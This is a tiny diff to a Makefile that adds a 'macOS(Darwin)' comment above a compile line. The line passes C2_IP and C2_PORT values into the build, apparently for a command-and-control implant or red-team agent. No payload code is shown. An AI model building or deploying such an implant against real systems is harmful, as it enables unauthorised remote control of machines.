@@ -34,6 +34,7 @@ endif
 
 ifeq ($(shell uname -s),Darwin)
 	$(eval $(call uninp))
+	# macOS(Darwin)
 	$(CC) $(SRC) -o $(BIN) -Wl,-no_launcher,-sectcreate,__TEXT,__info_plist,/dev/null -DC2_IP=\"$(C2_IP)\" -DC2_PORT="$(C2_PORT)"
 endif
 
